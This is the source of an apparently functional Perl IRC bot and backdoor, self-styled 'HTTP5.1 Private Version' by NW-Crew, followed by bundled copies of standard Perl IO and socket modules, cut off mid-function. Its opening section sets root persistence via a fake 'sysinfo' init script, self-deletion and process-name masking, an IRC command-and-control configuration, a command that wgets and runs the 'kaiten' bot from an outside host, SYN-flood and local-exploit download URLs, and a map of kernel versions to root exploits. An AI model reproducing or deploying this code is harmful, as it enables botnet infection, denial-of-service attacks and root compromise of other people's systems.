#!/usr/bin/perl
### Forking ###
my $PID = fork;
exit if $PID;
close(PID);
### End Forking ###
###########################################################################################
###########################################################################################
###########################################################################################
###########################################################################################
###########################################################################################
###########################################################################################
###########################################################################################
###########################################################################################
###########################################################################################
###########################################################################################
###########################################################################################
###########################################################################################
###########################################################################################
###############################HTTP5.1 Private Version#####################################
##########################Hyper Technology Transit Portal##################################
###########################################################################################
###########################################################################################
####For Information about http3,http4 and the private versions contact me at:##############
###########################################################################################
###########################################################################################
#                   ___ ___    __     __  __________   .________
#                  /   |   \ _/  |_ _/  |_\______   \  |   ____/
#                 /    ~    \\   __\\   __\|     ___/  |____  \ 
#                 \    Y    / |  |   |  |  |    |      /       \
#                  \___|_  /  |__|   |__|  |____|     /______  /
#                        \/                                  \/
###########################################################################################
#New Features. better code. faster							  #
#Irc connection Improved     								  #
#NO Module required								  	  #
#NW-CREW r0x									      	  #
#Irc connection Improved								  #
#You can trash your old Http1 ;)						          #
#Oh, this code is only demostrative only =)						  #	        
###########################################################################################
###########################################################################################
###########################################################################################
###########################################################################################
###########################################################################################
###########################################################################################
###########################################################################################
###########################################################################################
###########################################################################################
###########################################################################################
###########################################################################################
###########################################################################################

###Getting inside###

if(`id`=~/root/i){
#METTERE FUNZIONE AUTOr00t
	if(-d '/etc/init.d'){
		my $initd='/etc/init.d';
	} elsif (-d '/etc/rc.d/init.d'){
		my $initd='/etc/rc.d/init.d';
	}

	if($initd){
		if(!-e $initd.'sysinfo'){


			`cp $0 $initd/sysinfo`;
			`ln -s $initd/sysinfo /etc/rc0.d/K20sysinfo`;
			`ln -s $initd/sysinfo /etc/rc1.d/K20sysinfo`;
			`ln -s $initd/sysinfo /etc/rc6.d/K20sysinfo`;
			`ln -s $initd/sysinfo /etc/rc2.d/S20sysinfo`;
			`ln -s $initd/sysinfo /etc/rc3.d/S20sysinfo`;
			`ln -s $initd/sysinfo /etc/rc4.d/S20sysinfo`;
			`ln -s $initd/sysinfo /etc/rc5.d/S20sysinfo`;


		}
	}

}


#### Configuration ####
my @chars = ("a" , "b" , "c" , "d" , "e" , "f" , "g" , "h",
			 "i" , "j" , "k" , "l" , "m" , "n" , "o" , "p",
			 "q" , "r" , "s" , "t" , "u" , "v" , "w" , "z" ,
			 "x" , "y" , "1", "2", "3" , "4" , "5", "6" , "7" ,
			 "8" , "9" , "0");
my $prefix = "dev";
my $prefix_os = 1;
my $processo = processo();
my $nick = genick();
my $server = "my.irc.server";     
my $porta = 12900;                  
my $ident = "Net-warriors";          
my $realname = "Net-warriors";    
my @canali = ("#channel|channelpass","#2channel|2channelpass");
my $password = "YOUR ENCRYPTED STRING HERE";
my $synurl="http://www.geocities.com/fryxar/tcpflood.c"; #Synflood c source code code
my $synurlcompiled="http://www.geocities.com/fryxar/tcpflood.c"; #Synflod binary
my $cmd="cd /var/tmp/;rm kaiten;wget http://some.host/kaiten ;chmod 777 kaiten ; ./kaiten  ";  #This is the payload executed on the router
my $localurl = "http://nwcrew.sytes.net/locals/";
my $linas_max=5; #don't touch below if you don't know what are you doing
my $sprelink="$ARGV[0]" if $ARGV[0]; #don't touch
my $sprepath="$ARGV[1]" if $ARGV[1];#don't touch
my $sleep = 2; 
my $totexp=0;
my $def = "Nw-Crew Owned You!";
my $tmp = $linas_max;
my %kernels;
my $uname=`uname -a`;
my $uptime=`uptime`;
my $ownd=`pwd`;
my $distro=`cat /etc/issue`;
my $id=`id`;
my $un=`uname -sro`;
my $sym_uname=`uname`;
my $sym_id=`id -ng`;
my @memory=('');
my $memory_size=200;

chop $sym_id;
chop $sym_uname;

$kernels{'2.4.17'}="newlocal,kmod";
$kernels{'2.4.18'}="newlocal,kmod,km.2,brk,brk2";
$kernels{'2.4.19'}="newlocal,kmod,km.2,brk,brk2";
$kernels{'2.4.20'}="ptrace,ptrace-kmod,kmod,km.2,brk,brk2,elfbl,linux2.4,lezr-br,lezr-km,lezr-wt";
$kernels{'2.4.21'}="ptrace,ptrace-kmod,km.2,brk,brk2,elfbl,lezr-br,lezr-km,lezr-wt";
$kernels{'2.4.22'}="ptrace,ptrace-kmod,km.2,brk,brk2,elfbl,lezr-br,lezr-km,lezr-wt";
$kernels{'2.4.22-10'}="loginx";
$kernels{'2.4.23'}="mremap_pte";
$kernels{'2.4.24'}="mremap_pte,uselib24";
$kernels{'2.4.25'}="lezr-br,lezr-km,lezr-wt,lezr-mer";
$kernels{'2.4.25-1'}="uselib24";
$kernels{'2.4.27'}="uselib24";
$kernels{'2.6'}="k-rad1,k-rad2,k-rad3";
$kernels{'2.6.2'}="mremap_pte,krad,h00lyshit";
$kernels{'2.6.5'}="krad,krad2,h00lyshit";
$kernels{'2.6.6'}="krad,krad2,h00lyshit";
$kernels{'2.6.7'}="krad,krad2,h00lyshit";
$kernels{'2.6.8'}="krad,krad2,h00lyshit";
$kernels{'2.6.9'}="krad,krad2,h00lyshit";
$kernels{'2.6.10'}="krad,krad2,h00lyshit";
$kernels{'2.6.8-5'}="krad,krad2,h00lyshit";
$kernels{'2.6.9-34'}="r00t,h00lyshit";
$kernels{'2.6.11'}="k-rad3";
$kernels{'2.6.13-17'}="prctl,h00lyshit";
$kernels{'2.6.17'}="17";
$kernels{'2.6.23'}="24";
$kernels{'2.6.24'}="24";
$kernels{'2.6.24.1'}="17";
$kernels{'3.6'}="BSD3.6_localroot";
$kernels{'4.8'}="48local";
$kernels{'5.4'}="local";
$kernels{'4.11'}="masterpass";
$kernels{'RELEASE'}="bsdlocal";
$kernels{'RELEASE'}="rootbsd";

unlink($0);
$0=$processo."\0"x16;
#### End Configuration, Don't Touch Below, if u don't know what u are doing! ####

## Including the IO Package and XLoader##

{
package XSLoader;

$VERSION = "0.08";

#use strict;

# enable debug/trace messages from DynaLoader perl code
# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;

  my $dl_dlext = 'so';

package DynaLoader;

# No prizes for guessing why we don't say 'bootstrap DynaLoader;' here.
# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB
boot_DynaLoader('DynaLoader') if defined(&boot_DynaLoader) &&
                                !defined(&dl_error);
package XSLoader;

sub load {
    package DynaLoader;

    die q{XSLoader::load('Your::Module', $Your::Module::VERSION)} unless @_;

    my($module) = $_[0];

    # work with static linking too
    my $b = "$module\::bootstrap";
    goto &$b if defined &$b;

    goto retry unless $module and defined &dl_load_file;

    my @modparts = split(/::/,$module);
    my $modfname = $modparts[-1];

    my $modpname = join('/',@modparts);
    my $modlibname = (caller())[1];
    my $c = @modparts;
    $modlibname =~ s,[\\/][^\\/]+$,, while $c--;	# Q&D basename
    my $file = "$modlibname/auto/$modpname/$modfname.$dl_dlext";

#   print STDERR "XSLoader::load for $module ($file)\n" if $dl_debug;

    my $bs = $file;
    $bs =~ s/(\.\w+)?(;\d*)?$/\.bs/; # look for .bs 'beside' the library

    goto retry if not -f $file or -s $bs;

    my $bootname = "boot_$module";
    $bootname =~ s/\W/_/g;
    @DynaLoader::dl_require_symbols = ($bootname);

    my $boot_symbol_ref;

    # Many dynamic extension loading problems will appear to come from
    # this section of code: XYZ failed at line 123 of DynaLoader.pm.
    # Often these errors are actually occurring in the initialisation
    # C code of the extension XS file. Perl reports the error as being
    # in this perl code simply because this was the last perl code
    # it executed.

    my $libref = dl_load_file($file, 0) or do { 
        require Carp;
        Carp::croak("Can't load '$file' for module $module: " . dl_error());
    };
    push(@DynaLoader::dl_librefs,$libref);  # record loaded object

    my @unresolved = dl_undef_symbols();
    if (@unresolved) {
        require Carp;
        Carp::carp("Undefined symbols present after loading $file: @unresolved\n");
    }

    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {
        require Carp;
        Carp::croak("Can't find '$bootname' symbol in $file\n");
    };

    push(@DynaLoader::dl_modules, $module); # record loaded module

  boot:
    my $xs = dl_install_xsub("${module}::bootstrap", $boot_symbol_ref, $file);

    # See comment block above
    push(@DynaLoader::dl_shared_objects, $file); # record files loaded
    return &$xs(@_);

  retry:
    my $bootstrap_inherit = DynaLoader->can('bootstrap_inherit') || 
                            XSLoader->can('bootstrap_inherit');
    goto &$bootstrap_inherit;
}

# Versions of DynaLoader prior to 5.6.0 don't have this function.
sub bootstrap_inherit {
    package DynaLoader;

    my $module = $_[0];
    local *DynaLoader::isa = *{"$module\::ISA"};
    local @DynaLoader::isa = (@DynaLoader::isa, 'DynaLoader');
    # Cannot goto due to delocalization.  Will report errors on a wrong line?
    DynaLoader::bootstrap(@_);
}

1;

}



{
package IO;

use Carp;

sub import {
    shift;
   
    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);

    eval join("", map { "require IO::" . (/(\w+)/)[0] . ";\n" } @l)
	or croak $@;
}

1;
}

{package IO::Handle;


#our($VERSION, @EXPORT_OK, @ISA);
use Carp;
use Symbol;
use SelectSaver;
require Exporter;
@ISA = qw(Exporter);

$VERSION = "1.27";
$VERSION = eval $VERSION;

@EXPORT_OK = qw(
    autoflush
    output_field_separator
    output_record_separator
    input_record_separator
    input_line_number
    format_page_number
    format_lines_per_page
    format_lines_left
    format_name
    format_top_name
    format_line_break_characters
    format_formfeed
    format_write

    print
    printf
    say
    getline
    getlines

    printflush
    flush

    SEEK_SET
    SEEK_CUR
    SEEK_END
    _IOFBF
    _IOLBF
    _IONBF
);

################################################
## Constructors, destructors.
##

sub new {
    my $class = ref($_[0]) || $_[0] || "IO::Handle";
    @_ == 1 or croak "usage: new $class";
    my $io = gensym;
    bless $io, $class;
}

sub new_from_fd {
    my $class = ref($_[0]) || $_[0] || "IO::Handle";
    @_ == 3 or croak "usage: new_from_fd $class FD, MODE";
    my $io = gensym;
    shift;
    IO::Handle::fdopen($io, @_)
	or return undef;
    bless $io, $class;
}

#
# There is no need for DESTROY to do anything, because when the
# last reference to an IO object is gone, Perl automatically
# closes its associated files (if any).  However, to avoid any
# attempts to autoload DESTROY, we here define it to do nothing.
#
sub DESTROY {}


################################################
## Open and close.
##

sub _open_mode_string {
    my ($mode) = @_;
    $mode =~ /^\+?(<|>>?)$/
      or $mode =~ s/^r(\+?)$/$1</
      or $mode =~ s/^w(\+?)$/$1>/
      or $mode =~ s/^a(\+?)$/$1>>/
      or croak "IO::Handle: bad open mode: $mode";
    $mode;
}

sub fdopen {
    @_ == 3 or croak 'usage: $io->fdopen(FD, MODE)';
    my ($io, $fd, $mode) = @_;
    local(*GLOB);

    if (ref($fd) && "".$fd =~ /GLOB\(/o) {
	# It's a glob reference; Alias it as we cannot get name of anon GLOBs
	my $n = qualify(*GLOB);
	*GLOB = *{*$fd};
	$fd =  $n;
    } elsif ($fd =~ m#^\d+$#) {
	# It's an FD number; prefix with "=".
	$fd = "=$fd";
    }

    open($io, _open_mode_string($mode) . '&' . $fd)
	? $io : undef;
}

sub close {
    @_ == 1 or croak 'usage: $io->close()';
    my($io) = @_;

    close($io);
}

################################################
## Normal I/O functions.
##

# flock
# select

sub opened {
    @_ == 1 or croak 'usage: $io->opened()';
    defined fileno($_[0]);
}

sub fileno {
    @_ == 1 or croak 'usage: $io->fileno()';
    fileno($_[0]);
}

sub getc {
    @_ == 1 or croak 'usage: $io->getc()';
    getc($_[0]);
}

sub eof {
    @_ == 1 or croak 'usage: $io->eof()';
    eof($_[0]);
}

sub print {
    @_ or croak 'usage: $io->print(ARGS)';
    my $this = shift;
    print $this @_;
}

sub printf {
    @_ >= 2 or croak 'usage: $io->printf(FMT,[ARGS])';
    my $this = shift;
    printf $this @_;
}

sub say {
    @_ or croak 'usage: $io->say(ARGS)';
    my $this = shift;
    print $this @_, "\n";
}

sub getline {
    @_ == 1 or croak 'usage: $io->getline()';
    my $this = shift;
    return scalar <$this>;
} 

*gets = \&getline;  # deprecated

sub getlines {
    @_ == 1 or croak 'usage: $io->getlines()';
    wantarray or
	croak 'Can\'t call $io->getlines in a scalar context, use $io->getline';
    my $this = shift;
    return <$this>;
}

sub truncate {
    @_ == 2 or croak 'usage: $io->truncate(LEN)';
    truncate($_[0], $_[1]);
}

sub read {
    @_ == 3 || @_ == 4 or croak 'usage: $io->read(BUF, LEN [, OFFSET])';
    read($_[0], $_[1], $_[2], $_[3] || 0);
}

sub sysread {
    @_ == 3 || @_ == 4 or croak 'usage: $io->sysread(BUF, LEN [, OFFSET])';
    sysread($_[0], $_[1], $_[2], $_[3] || 0);
}

sub write {
    @_ >= 2 && @_ <= 4 or croak 'usage: $io->write(BUF [, LEN [, OFFSET]])';
    local($\) = "";
    $_[2] = length($_[1]) unless defined $_[2];
    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);
}

sub syswrite {
    @_ >= 2 && @_ <= 4 or croak 'usage: $io->syswrite(BUF [, LEN [, OFFSET]])';
    if (defined($_[2])) {
	syswrite($_[0], $_[1], $_[2], $_[3] || 0);
    } else {
	syswrite($_[0], $_[1]);
    }
}

sub stat {
    @_ == 1 or croak 'usage: $io->stat()';
    stat($_[0]);
}

################################################
## State modification functions.
##

sub autoflush {
    my $old = new SelectSaver qualify($_[0], caller);
    my $prev = $|;
    $| = @_ > 1 ? $_[1] : 1;
    $prev;
}

sub output_field_separator {
    carp "output_field_separator is not supported on a per-handle basis"
	if ref($_[0]);
    my $prev = $,;
    $, = $_[1] if @_ > 1;
    $prev;
}

sub output_record_separator {
    carp "output_record_separator is not supported on a per-handle basis"
	if ref($_[0]);
    my $prev = $\;
    $\ = $_[1] if @_ > 1;
    $prev;
}

sub input_record_separator {
    carp "input_record_separator is not supported on a per-handle basis"
	if ref($_[0]);
    my $prev = $/;
    $/ = $_[1] if @_ > 1;
    $prev;
}

sub input_line_number {
    local $.;
    () = tell qualify($_[0], caller) if ref($_[0]);
    my $prev = $.;
    $. = $_[1] if @_ > 1;
    $prev;
}

sub format_page_number {
    my $old;
    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);
    my $prev = $%;
    $% = $_[1] if @_ > 1;
    $prev;
}

sub format_lines_per_page {
    my $old;
    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);
    my $prev = $=;
    $= = $_[1] if @_ > 1;
    $prev;
}

sub format_lines_left {
    my $old;
    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);
    my $prev = $-;
    $- = $_[1] if @_ > 1;
    $prev;
}

sub format_name {
    my $old;
    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);
    my $prev = $~;
    $~ = qualify($_[1], caller) if @_ > 1;
    $prev;
}

sub format_top_name {
    my $old;
    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);
    my $prev = $^;
    $^ = qualify($_[1], caller) if @_ > 1;
    $prev;
}

sub format_line_break_characters {
    carp "format_line_break_characters is not supported on a per-handle basis"
	if ref($_[0]);
    my $prev = $:;
    $: = $_[1] if @_ > 1;
    $prev;
}

sub format_formfeed {
    carp "format_formfeed is not supported on a per-handle basis"
	if ref($_[0]);
    my $prev = $^L;
    $^L = $_[1] if @_ > 1;
    $prev;
}

sub formline {
    my $io = shift;
    my $picture = shift;
    local($^A) = $^A;
    local($\) = "";
    formline($picture, @_);
    print $io $^A;
}

sub format_write {
    @_ < 3 || croak 'usage: $io->write( [FORMAT_NAME] )';
    if (@_ == 2) {
	my ($io, $fmt) = @_;
	my $oldfmt = $io->format_name(qualify($fmt,caller));
	CORE::write($io);
	$io->format_name($oldfmt);
    } else {
	CORE::write($_[0]);
    }
}

# XXX undocumented
sub fcntl {
    @_ == 3 || croak 'usage: $io->fcntl( OP, VALUE );';
    my ($io, $op) = @_;
    return fcntl($io, $op, $_[2]);
}

# XXX undocumented
sub ioctl {
    @_ == 3 || croak 'usage: $io->ioctl( OP, VALUE );';
    my ($io, $op) = @_;
    return ioctl($io, $op, $_[2]);
}

# this sub is for compatability with older releases of IO that used
# a sub called constant to detemine if a constant existed -- GMB
#
# The SEEK_* and _IO?BF constants were the only constants at that time
# any new code should just chech defined(&CONSTANT_NAME)

sub constant {
    no strict 'refs';
    my $name = shift;
    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})
	? &{$name}() : undef;
}


# so that flush.pl can be deprecated

sub printflush {
    my $io = shift;
    my $old;
    $old = new SelectSaver qualify($io, caller) if ref($io);
    local $| = 1;
    if(ref($io)) {
        print $io @_;
    }
    else {
	print @_;
    }
}

1;
}

{

# IO::Select.pm
#
# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.
# This program is free software; you can redistribute it and/or
# modify it under the same terms as Perl itself.

package IO::Select;

use     vars qw($VERSION @ISA);
require Exporter;

$VERSION = "1.17";

@ISA = qw(Exporter); # This is only so we can do version checking

sub VEC_BITS () {0}
sub FD_COUNT () {1}
sub FIRST_FD () {2}

sub new
{
 my $self = shift;
 my $type = ref($self) || $self;

 my $vec = bless [undef,0], $type;

 $vec->add(@_)
    if @_;

 $vec;
}

sub add
{
 shift->_update('add', @_);
}


sub remove
{
 shift->_update('remove', @_);
}


sub exists
{
 my $vec = shift;
 my $fno = $vec->_fileno(shift);
 return undef unless defined $fno;
 $vec->[$fno + FIRST_FD];
}


sub _fileno
{
 my($self, $f) = @_;
 return unless defined $f;
 $f = $f->[0] if ref($f) eq 'ARRAY';
 ($f =~ /^\d+$/) ? $f : fileno($f);
}

sub _update
{
 my $vec = shift;
 my $add = shift eq 'add';

 my $bits = $vec->[VEC_BITS];
 $bits = '' unless defined $bits;

 my $count = 0;
 my $f;
 foreach $f (@_)
  {
   my $fn = $vec->_fileno($f);
   next unless defined $fn;
   my $i = $fn + FIRST_FD;
   if ($add) {
     if (defined $vec->[$i]) {
	 $vec->[$i] = $f;  # if array rest might be different, so we update
	 next;
     }
     $vec->[FD_COUNT]++;
     vec($bits, $fn, 1) = 1;
     $vec->[$i] = $f;
   } else {      # remove
     next unless defined $vec->[$i];
     $vec->[FD_COUNT]--;
     vec($bits, $fn, 1) = 0;
     $vec->[$i] = undef;
   }
   $count++;
  }
 $vec->[VEC_BITS] = $vec->[FD_COUNT] ? $bits : undef;
 $count;
}

sub can_read
{
 my $vec = shift;
 my $timeout = shift;
 my $r = $vec->[VEC_BITS];

 defined($r) && (select($r,undef,undef,$timeout) > 0)
    ? handles($vec, $r)
    : ();
}

sub can_write
{
 my $vec = shift;
 my $timeout = shift;
 my $w = $vec->[VEC_BITS];

 defined($w) && (select(undef,$w,undef,$timeout) > 0)
    ? handles($vec, $w)
    : ();
}

sub has_exception
{
 my $vec = shift;
 my $timeout = shift;
 my $e = $vec->[VEC_BITS];

 defined($e) && (select(undef,undef,$e,$timeout) > 0)
    ? handles($vec, $e)
    : ();
}

sub has_error
{
 goto &has_exception;
}

sub count
{
 my $vec = shift;
 $vec->[FD_COUNT];
}

sub bits
{
 my $vec = shift;
 $vec->[VEC_BITS];
}

sub as_string  # for debugging
{
 my $vec = shift;
 my $str = ref($vec) . ": ";
 my $bits = $vec->bits;
 my $count = $vec->count;
 $str .= defined($bits) ? unpack("b*", $bits) : "undef";
 $str .= " $count";
 my @handles = @$vec;
 splice(@handles, 0, FIRST_FD);
 for (@handles) {
     $str .= " " . (defined($_) ? "$_" : "-");
 }
 $str;
}

sub _max
{
 my($a,$b,$c) = @_;
 $a > $b
    ? $a > $c
        ? $a
        : $c
    : $b > $c
        ? $b
        : $c;
}

sub select
{
 shift
   if defined $_[0] && !ref($_[0]);

 my($r,$w,$e,$t) = @_;
 my @result = ();

 my $rb = defined $r ? $r->[VEC_BITS] : undef;
 my $wb = defined $w ? $w->[VEC_BITS] : undef;
 my $eb = defined $e ? $e->[VEC_BITS] : undef;

 if(select($rb,$wb,$eb,$t) > 0)
  {
   my @r = ();
   my @w = ();
   my @e = ();
   my $i = _max(defined $r ? scalar(@$r)-1 : 0,
                defined $w ? scalar(@$w)-1 : 0,
                defined $e ? scalar(@$e)-1 : 0);

   for( ; $i >= FIRST_FD ; $i--)
    {
     my $j = $i - FIRST_FD;
     push(@r, $r->[$i])
        if defined $rb && defined $r->[$i] && vec($rb, $j, 1);
     push(@w, $w->[$i])
        if defined $wb && defined $w->[$i] && vec($wb, $j, 1);
     push(@e, $e->[$i])
        if defined $eb && defined $e->[$i] && vec($eb, $j, 1);
    }

   @result = (\@r, \@w, \@e);
  }
 @result;
}


sub handles
{
 my $vec = shift;
 my $bits = shift;
 my @h = ();
 my $i;
 my $max = scalar(@$vec) - 1;

 for ($i = FIRST_FD; $i <= $max; $i++)
  {
   next unless defined $vec->[$i];
   push(@h, $vec->[$i])
      if !defined($bits) || vec($bits, $i - FIRST_FD, 1);
  }
 
 @h;
}

1;
}


{# IO::Socket.pm
#
# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.
# This program is free software; you can redistribute it and/or
# modify it under the same terms as Perl itself.

package IO::Socket;

#require 5.006;
use Carp;
#our(@ISA, $VERSION, @EXPORT_OK);
use Exporter;
#use Errno;

# legacy


@ISA = qw(IO::Handle);

$VERSION = "1.30";

@EXPORT_OK = qw(sockatmark);

sub import {
    my $pkg = shift;
    if (@_ && $_[0] eq 'sockatmark') { # not very extensible but for now, fast
	Exporter::export_to_level('IO::Socket', 1, $pkg, 'sockatmark');
    } else {
	my $callpkg = caller;
	Exporter::export 'Socket', $callpkg, @_;
    }
}

sub new {
    my($class,%arg) = @_;
    my $sock = $class->SUPER::new();

    $sock->autoflush(1);

    ${*$sock}{'io_socket_timeout'} = delete $arg{Timeout};

    return scalar(%arg) ? $sock->configure(\%arg)
			: $sock;
}

my @domain2pkg;

sub register_domain {
    my($p,$d) = @_;
    $domain2pkg[$d] = $p;
}

sub configure {
    my($sock,$arg) = @_;
    my $domain = delete $arg->{Domain};

    croak 'IO::Socket: Cannot configure a generic socket'
	unless defined $domain;

    croak "IO::Socket: Unsupported socket domain"
	unless defined $domain2pkg[$domain];

    croak "IO::Socket: Cannot configure socket in domain '$domain'"
	unless ref($sock) eq "IO::Socket";

    bless($sock, $domain2pkg[$domain]);
    $sock->configure($arg);
}

sub socket {
    @_ == 4 or croak 'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)';
    my($sock,$domain,$type,$protocol) = @_;

    socket($sock,$domain,$type,$protocol) or
    	return undef;

    ${*$sock}{'io_socket_domain'} = $domain;
    ${*$sock}{'io_socket_type'}   = $type;
    ${*$sock}{'io_socket_proto'}  = $protocol;

    $sock;
}

sub socketpair {
    @_ == 4 || croak 'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)';
    my($class,$domain,$type,$protocol) = @_;
    my $sock1 = $class->new();
    my $sock2 = $class->new();

    socketpair($sock1,$sock2,$domain,$type,$protocol) or
    	return ();

    ${*$sock1}{'io_socket_type'}  = ${*$sock2}{'io_socket_type'}  = $type;
    ${*$sock1}{'io_socket_proto'} = ${*$sock2}{'io_socket_proto'} = $protocol;

    ($sock1,$sock2);
}

sub connect {
    @_ == 2 or croak 'usage: $sock->connect(NAME)';
    my $sock = shift;
    my $addr = shift;
    my $timeout = ${*$sock}{'io_socket_timeout'};
    my $err;
    my $blocking;

    #$blocking = $sock->blocking(0) if $timeout;
    if (!connect($sock, $addr)) {
	if (defined $timeout && $!{EINPROGRESS}) {

	    my $sel = new IO::Select $sock;

	    if (!$sel->can_write($timeout)) {
		#$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);
		$@ = "connect: timeout";
	    }
	    elsif (!connect($sock,$addr) && not $!{EISCONN}) {
		# Some systems refuse to re-connect() to
		# an already open socket and set errno to EISCONN.
		$err = $!;
		$@ = "connect: $!";
	    }
	}
        elsif ($blocking || !$!{EINPROGRESS})  {
	    $err = $!;
	    $@ = "connect: $!";
	}
    }

    $sock->blocking(1) if $blocking;

    $! = $err if $err;

    $err ? undef : $sock;
}

sub close {
    @_ == 1 or croak 'usage: $sock->close()';
    my $sock = shift;
    ${*$sock}{'io_socket_peername'} = undef;
    $sock->SUPER::close();
}

sub bind {
    @_ == 2 or croak 'usage: $sock->bind(NAME)';
    my $sock = shift;
    my $addr = shift;

    return bind($sock, $addr) ? $sock
			      : undef;
}

sub listen {
    @_ >= 1 && @_ <= 2 or croak 'usage: $sock->listen([QUEUE])';
    my($sock,$queue) = @_;
    $queue = 5
	unless $queue && $queue > 0;

    return listen($sock, $queue) ? $sock
				 : undef;
}

sub accept {
    @_ == 1 || @_ == 2 or croak 'usage $sock->accept([PKG])';
    my $sock = shift;
    my $pkg = shift || $sock;
    my $timeout = ${*$sock}{'io_socket_timeout'};
    my $new = $pkg->new(Timeout => $timeout);
    my $peer = undef;

    if(defined $timeout) {
	
	my $sel = new IO::Select $sock;

	unless ($sel->can_read($timeout)) {
	    $@ = 'accept: timeout';
	   # $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);
	    return;
	}
    }

    $peer = accept($new,$sock)
	or return;

    return wantarray ? ($new, $peer)
    	      	     : $new;
}

sub sockname {
    @_ == 1 or croak 'usage: $sock->sockname()';
    getsockname($_[0]);
}

sub peername {
    @_ == 1 or croak 'usage: $sock->peername()';
    my($sock) = @_;
    ${*$sock}{'io_socket_peername'} ||= getpeername($sock);
}

sub connected {
    @_ == 1 or croak 'usage: $sock->connected()';
    my($sock) = @_;
    getpeername($sock);
}

sub send {
    @_ >= 2 && @_ <= 4 or croak 'usage: $sock->send(BUF, [FLAGS, [TO]])';
    my $sock  = $_[0];
    my $flags = $_[2] || 0;
    my $peer  = $_[3] || $sock->peername;

    croak 'send: Cannot determine peer address'
	 unless($peer);

    my $r = defined(getpeername($sock))
	? send($sock, $_[1], $flags)
	: send($sock, $_[1], $flags, $peer);

    # remember who we send to, if it was successful
    ${*$sock}{'io_socket_peername'} = $peer
	if(@_ == 4 && defined $r);

    $r;
}

sub recv {
    @_ == 3 || @_ == 4 or croak 'usage: $sock->recv(BUF, LEN [, FLAGS])';
    my $sock  = $_[0];
    my $len   = $_[2];
    my $flags = $_[3] || 0;

    # remember who we recv'd from
    ${*$sock}{'io_socket_peername'} = recv($sock, $_[1]='', $len, $flags);
}

sub shutdown {
    @_ == 2 or croak 'usage: $sock->shutdown(HOW)';
    my($sock, $how) = @_;
    ${*$sock}{'io_socket_peername'} = undef;
    shutdown($sock, $how);
}

sub setsockopt {
    @_ == 4 or croak '$sock->setsockopt(LEVEL, OPTNAME, OPTVAL)';
    setsockopt($_[0],$_[1],$_[2],$_[3]);
}

my $intsize = length(pack("i",0));

sub getsockopt {
    @_ == 3 or croak '$sock->getsockopt(LEVEL, OPTNAME)';
    my $r = getsockopt($_[0],$_[1],$_[2]);
    # Just a guess
    $r = unpack("i", $r)
	if(defined $r && length($r) == $intsize);
    $r;
}

sub sockopt {
    my $sock = shift;
    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)
	    : $sock->setsockopt(SOL_SOCKET,@_);
}

sub atmark {
    @_ == 1 or croak 'usage: $sock->atmark()';
    my($sock) = @_;
    sockatmark($sock);
}

sub timeout {
    @_ == 1 || @_ == 2 or croak 'usage: $sock->timeout([VALUE])';
    my($sock,$val) = @_;
    my $r = ${*$sock}{'io_socket_timeout'};

    ${*$sock}{'io_socket_timeout'} = defined $val ? 0 + $val : $val
	if(@_ == 2);

    $r;
}

sub sockdomain {
    @_ == 1 or croak 'usage: $sock->sockdomain()';
    my $sock = shift;
    ${*$sock}{'io_socket_domain'};
}

sub socktype {
    @_ == 1 or croak 'usage: $sock->socktype()';
    my $sock = shift;
    ${*$sock}{'io_socket_type'}
}

sub protocol {
    @_ == 1 or croak 'usage: $sock->protocol()';
    my($sock) = @_;
    ${*$sock}{'io_socket_proto'};
}

1;

}

{

# IO::Socket::INET.pm
#
# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.
# This program is free software; you can redistribute it and/or
# modify it under the same terms as Perl itself.

package IO::Socket::INET;

use Carp;
use Exporter;

use Socket;

@ISA = qw(IO::Socket);
$VERSION = "1.31";

#my $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;

IO::Socket::INET->register_domain( AF_INET );

my %socket_type = ( tcp  => SOCK_STREAM,
		    udp  => SOCK_DGRAM,
		    icmp => SOCK_RAW
		  );
my %proto_number;
$proto_number{tcp}  = Socket::IPPROTO_TCP()  if defined &Socket::IPPROTO_TCP;
$proto_number{upd}  = Socket::IPPROTO_UDP()  if defined &Socket::IPPROTO_UDP;
$proto_number{icmp} = Socket::IPPROTO_ICMP() if defined &Socket::IPPROTO_ICMP;
my %proto_name = reverse %proto_number;

sub new {
    my $class = shift;
    unshift(@_, "PeerAddr") if @_ == 1;
    return $class->SUPER::new(@_);
}

sub _cache_proto {
    my @proto = @_;
    for (map lc($_), $proto[0], split(' ', $proto[1])) {
	$proto_number{$_} = $proto[2];
    }
    $proto_name{$proto[2]} = $proto[0];
}

sub _get_proto_number {
    my $name = lc(shift);
    return undef unless defined $name;
    return $proto_number{$name} if exists $proto_number{$name};

    my @proto = getprotobyname($name);
    return undef unless @proto;
    _cache_proto(@proto);

    return $proto[2];
}

sub _get_proto_name {
    my $num = shift;
    return undef unless defined $num;
    return $proto_name{$num} if exists $proto_name{$num};

    my @proto = getprotobynumber($num);
    return undef unless @proto;
    _cache_proto(@proto);

    return $proto[0];
}

sub _sock_info {
  my($addr,$port,$proto) = @_;
  my $origport = $port;
  my @serv = ();

  $port = $1
	if(defined $addr && $addr =~ s,:([\w\(\)/]+)$,,);

  if(defined $proto  && $proto =~ /\D/) {
    my $num = _get_proto_number($proto);
    unless (defined $num) {
      $@ = "Bad protocol '$proto'";
      return;
    }
    $proto = $num;
  }

  if(defined $port) {
    my $defport = ($port =~ s,\((\d+)\)$,,) ? $1 : undef;
    my $pnum = ($port =~ m,^(\d+)$,)[0];

    @serv = getservbyname($port, _get_proto_name($proto) || "")
	if ($port =~ m,\D,);

